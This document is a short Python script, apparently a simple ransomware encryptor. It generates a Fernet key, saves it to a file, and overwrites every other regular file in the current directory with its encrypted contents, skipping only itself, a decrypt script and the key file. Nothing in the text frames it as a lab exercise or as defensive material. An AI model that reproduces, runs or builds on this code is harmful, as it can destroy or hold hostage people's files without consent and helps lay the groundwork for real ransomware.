import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file=="encrypt.py" or file=='decrypt.py' or file=="TheKey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key=Fernet.generate_key()

with open('TheKey.key',"wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,'rb') as theFile:
        contents=theFile.read()
    contents_encryption = Fernet(key).encrypt(contents)
    with open(file,'wb') as theFile:
        theFile.write(contents_encryption)
